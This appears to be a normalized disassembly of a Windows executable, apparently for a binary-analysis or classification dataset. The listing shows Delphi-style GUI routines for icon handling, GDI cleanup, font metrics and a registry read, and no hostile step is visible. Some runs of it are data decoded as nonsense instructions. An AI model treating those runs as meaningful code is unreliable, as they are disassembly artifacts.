pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452d8a
mov eax [ ebp - 0x18 ]
push eax
call DeleteObject
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x48 ]
dec eax
test eax eax
jl r-xdata
push 0x0
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x70 ]
push eax
mov eax [ ebp - 0xc ]
call sub_451144
call sub_44df24
push eax
call SetDIBits
inc eax
mov [ ebp - 0x10 ] eax
dec [ ebp - 0x10 ]
jne r-xdata
inc eax
mov eax [ ebp - 0x4c ]
dec eax
test eax eax
jl r-xdata
mov [ edx + 0x3 ] 0xff
xor esi esi
mov [ edx ] esi
jmp r-xdata
cmp [ ecx ] 0x0
je r-xdata
add edx 0x4
add ecx 0x4
dec eax
jne r-xdata
sub_452dd4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_44f470
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
inc [ eax + 0x4 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_452e28
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_44fd78
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4312a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_452e58
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_4531b8
mov edi ebx
mov eax [ edi + 0x28 ]
inc [ eax + 0x4 ]
mov eax [ esi + 0x28 ]
call sub_44fd78
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4312cc
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_452eb4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_452f10
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x38 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_452f38
push ebx
mov ebx eax
mov edx [ ebx + 0x28 ]
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
pop ebx
retn
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0xc
call GetSystemMetrics
mov eax ebx
call sub_452f90
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
jmp r-xdata
sub_452f64
push ebx
mov ebx eax
mov edx [ ebx + 0x28 ]
mov eax [ edx + 0xc ]
test eax eax
jne r-xdata
pop ebx
retn
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0xc
call GetSystemMetrics
mov eax ebx
call sub_452f90
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
jmp r-xdata
sub_452f90
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_433c88
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0x8 ]
call sub_433ebc
movzx eax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x14 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0xc ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_44ed30
jmp r-xdata
jmp r-xdata
call sub_44e1e8
sub_453008
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453095
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_452f10
cmp eax [ rw-data ]
jne r-xdata
call sub_44e1e8
mov eax esi
call sub_452f10
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_44f270
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_404c14
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_433ef4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4530bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
call LoadIconW
mov edx eax
mov eax ebx
call sub_453268
pop edi
pop esi
pop ebx
retn
sub_4530dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax edi
call sub_407134
push eax
push esi
call LoadIconW
mov edx eax
mov eax ebx
call sub_453268
pop edi
pop esi
pop ebx
retn
sub_453100
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45318e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_433c68
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_433ebc
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_433ebc
movzx eax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4531b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_44e1e8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453193
mov eax [ ebp - 0x4 ]
call sub_4055f0
call sub_406120
call sub_406174
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4531b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4531f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x4 ]
mov eax [ ebx + 0x28 ]
call sub_44fd78
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45322c
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp [ esi + 0x4 ] 0x1
jle r-xdata
mov edi [ esi + 0x14 ]
xor eax eax
mov [ esi + 0x14 ] eax
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
push eax
call CopyIcon
mov edx eax
xor ecx ecx
mov eax ebx
call sub_4531b8
sub_453268
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4531b8
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetIconInfo
test eax eax
je r-xdata
xor edx edx
push ebp
push sub_4532e5
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x30 ]
push eax
push 0x18
mov eax [ ebp - 0x8 ]
push eax
call GetObjectW
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x2c ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x28 ]
mov [ eax + 0x10 ] edx
sub_453350
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453008
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_433ef4
pop esi
pop ebx
retn
sub_4533a0
push ebp
mov ebp esp
push ecx
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4533e5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x5a
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4533ec
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
sub_453404
push ebx
push esi
add esp 0xffffffc4
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x3c
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsW
test eax eax
je r-xdata
movzx ebx [ esp + 0x38 ]
sub_453448
push ebp
mov ebp esp
add esp 0xfffffef8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453546
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_444aac
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_453503
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x80000002
mov eax [ ebp - 0x8 ]
call sub_444b94
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_444e10
test al al
je r-xdata
call sub_453404
cmp al 0x80
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45350a
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_44570c
mov eax [ ebp - 0x8 ]
call sub_444b64
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4070fc
sub_45350a
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45354d
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_409ff8
lea edx [ ebp - 0x108 ]
mov eax rw-data
mov cl 0x7c
call sub_404ad0
sub_4535ff
dec [ esi ]
add [ eax ] al
add [ ebp ] cl
push ebx
add [ eax ] ah
add [ ebx ] dl
push 0x6c006500
add [ eax + eax + 0x20 ] ch
nop
cld
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3ffbac8 ] al
jb r-xdata
inc ebp
add [ 0x4537 ] ah
add [ eax ] al
add [ ecx + 0x37 ] bl
inc ebp
add [ eax + eax ] ah
add [ eax ] al
cmp al 0x14
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
add [ edx ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi ] dh
inc ebp
add [ edx ] al
add [ esi + esi ] bh
inc ebp
add [ esi ] cl
or [ eax + edx * 2 + 0x61 ] dl
je r-xdata
add ah bh
jb r-xdata
cmp [ eax ] 0x45
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
and al 0x36
inc ebp
add [ eax ] al
add [ eax ] al
add [ edx ] al
add al 0x4e
js r-xdata
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
push esi
add al [ eax ]
js r-xdata
add [ eax + eax + 0x6c ] al
add [ edi ] ah
and [ eax ] al
xor al [ eax ]
add [ eax ] al
add [ eax ] al
sub [ esi ] dh
inc ebp
add [ eax + ecx ] dl
push eax
push eax
popad
je r-xdata
and [ eax ] al
push ebx
add [ eax ] ch
add [ gs : eax + eax + 0x6c ] ch
add [ eax ] ah
inc esp
add [ eax + eax ] al
add [ eax ] al
add al [ esi ]
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0xf8000270
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add cl [ edx ]
inc edx
imul eax [ ebx + 0x6f ] 0x6c
outsd
jb r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
pop eax
inc eax
add [ eax - 0x2fffbfa8 ] dh
add al [ gs : eax ]
clc
adc [ eax ] al
or al 0x0
add [ eax ] al
add cl [ edx ]
inc esi
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ah
cmp [ ebp ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ esi + esi ] ah
inc ebp
add [ eax + eax ] al
add [ eax ] al
add al 0x4c
imul esi [ ebx + 0x74 ] 0x28000002
scasb [ edi ]
inc eax
add [ eax ] cl
add [ eax ] al
add [ 0x636f4c46 ] al
imul eax [ edx ] 0x0
add [ eax ] al
push es
add [ ecx + 0x37 ] ch
inc ebp
add [ edx ] al
hlt
add al [ gs : eax ]
add al [ eax ]
sub_4538ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4538e4
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_453ae8
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_453928
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_453910
xor eax eax
push ebp
push sub_4539c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4539d0
mov eax [ ebp - 0x4 ]
call sub_45391c
retn
mov eax 0x10
call sub_404204
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4539dc
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_4539dc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_453ac4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x8 ]
call sub_451144
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x48 ]
xor edx edx
call sub_44ce9c
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x48 ]
mov edx ebx
call sub_44cd1c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov ecx eax
xor edx edx
xor eax eax
call sub_40ab90
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_450ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453ae8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_453910
xor eax eax
push ebp
push sub_453b35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453b3c
mov eax [ ebp - 0x4 ]
call sub_45391c
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453b3c
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_404220
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
jne r-xdata
mov eax esi
call sub_4055f0
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_453910
xor eax eax
push ebp
push sub_453b35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453b3c
mov eax [ ebp - 0x4 ]
call sub_45391c
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453b68
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_44bb2c
push eax
mov eax ebx
call sub_44bb2c
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_453928
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_453ba0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_453c73
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453c7a
retn
mov eax [ rw-data ]
call sub_4055f0
mov eax [ rw-data ]
call sub_4055f0
mov eax [ rw-data ]
call sub_4055f0
call sub_44fa18
mov eax [ rw-data ]
call sub_4055f0
mov eax [ rw-data ]
call sub_4055f0
mov eax [ rw-data ]
call sub_4055f0
mov eax [ rw-data ]
call sub_4055f0
mov eax [ rw-data ]
call sub_4055f0
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
call sub_409cb4
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_407e40
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_407e40
sub_455387
dec [ edx ]
add [ eax ] al
add [ ebx ] ah
insb
add [ edi ] dl
add [ gs : edx ] ah
inc edx
add [ eax + eax + 0x61 ] ch
add [ ebx ] ah
imul eax [ eax ] 0x0
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4553fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455404
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x8a
mov edx [ r-xdata ]
call sub_407e40
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_455c40
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
add edx 0x2
mov esi edx
jmp r-xdata
movzx ecx [ edx ]
test cx cx
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cx 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
add edx 0x2
add edx 0x2
sub_455e74
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
lea eax [ edi + 0x4 ]
mov edx esi
call sub_407254
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_407254
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_407254
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_455ed4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_455f47
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_407254
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_407768
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455f4e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_407254
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_407768
je r-xdata
sub_455f5c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
popad
inc ebp
add [ eax + 0x60 ] cl
inc ebp
add [ ecx + 0x60 ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add al cl
pushad
inc ebp
add [ eax + eax ] ah
add [ esi + eax * 4 + 0x56ac0044 ] cl
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ ecx + edx * 8 ] ah
inc esp
add [ ebx + edx + 0x13a40043 ] bl
inc ebx
add ah cl
adc al [ ebx ]
mov ah 0xda
inc esp
add ah bh
fiadd [ eax + eax + 0x40 ]
fiadd [ eax + eax - 0x78 ]
fiadd [ eax + eax + 0x68 ]
fiadd [ eax + eax - 0x4c ]
fiadd [ eax + eax - 0xc ]
into
inc esp
add [ edx ] ah
inc ebp
add [ eax ] al
loopne r-xdata
add al bl
fld [ eax + eax + 0x20 ]
fiadd [ eax + eax + 0x28 ]
fiadd [ eax + eax + 0x78 ]
fiadd [ eax + eax + 0x6c ]
fld [ eax + eax - 0x20 ]
fiadd [ eax + eax - 0x44 ]
fadd [ eax + eax - 0x38 ]
fild [ eax + eax ]
bound eax [ ebp ]
add [ eax ] eax
xlat
pushad
inc ebp
add [ eax ] bl
add [ eax ] al
add [ eax ] al
pop es
push eax
jb r-xdata
add [ ecx + edx * 8 - 0x2e23ffbc ] al
inc esp
add [ eax - 0x7fffbb2c ] ah
aad 0x44
add [ esi + edx * 8 ] ch
inc esp
add al ah
salc
inc esp
add [ edi + edx * 8 ] dl
inc esp
add [ edi + edx * 8 + 0x44 ] bl
add [ eax - 0x17ffbb29 ] bl
xlat
inc esp
add [ eax + ebx * 8 ] ch
inc esp
add [ eax + ebx * 8 + 0x44 ] ah
add [ eax - 0x17ffbb28 ] dl
fadd [ eax + eax + 0x24 ]
fld [ eax + eax + 0x60 ]
fld [ eax + eax - 0x64 ]
fld [ eax + eax - 0x28 ]
popad
inc ebp
add [ edx ] ah
hlt
outsb
je r-xdata
imul esp [ ecx + 0x45 ] 0xf4006200
dec [ esi ]
push esp
push eax
jb r-xdata
jb r-xdata
add [ eax ] al
add al 0x53
outsb
je r-xdata
add ecx eax
pop ecx
inc ebp
add [ eax ] bl
add [ eax ] al
pop es
push eax
jb r-xdata
add [ ebx ] al
enter 0x4559 0x0
pop eax
add [ eax ] al
add [ edi ] al
mov eax edi
call sub_44d060
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
inc esi
insb
add al [ eax ]
add al [ eax ]
sub [ eax ] al
and al 0x62
inc ebp
add [ eax ] cl
inc ebx
push 0x69676e61
outsb
add [ eax ] al
jb r-xdata
jbe r-xdata
outsb
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add [ eax ] al
or [ eax ] al
add [ eax ] eax
insb
add al [ eax ]
add al [ eax ]
nop
cwde
popad
inc ebp
add [ edi ] al
push cs
push esp
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ ecx + 0x45 ] dl
add al 0x53
sub al 0x0
popad
add [ ebx + edx * 2 ] al
jae r-xdata
outsb
jb r-xdata
pop eax
outsb
je r-xdata
xchg esp eax
popad
inc ebp
popad
je r-xdata
add al dh
push ebp
inc ebp
add [ eax ] bh
add ah al
popad
inc ebp
add [ ebx ] dl
add [ eax ] al
bound eax [ ebp ]
or al 0x43
jb r-xdata
add [ ebx ] al
inc ebx
jb r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
dec eax
popad
outsb
insb
add eax [ gs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
xchg esp eax
popad
inc ebp
add [ eax ] al
or [ eax ] al
add [ eax ] eax
xchg esp eax
popad
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
imul ebp [ bp + 0x67 ] 0x3
popad
je r-xdata
add [ esi ] al
inc ebx
popad
je r-xdata
add esp 0xc
mov [ ebx + ebx * 8 + 0x74e80f74 ] 0x64fffaf9
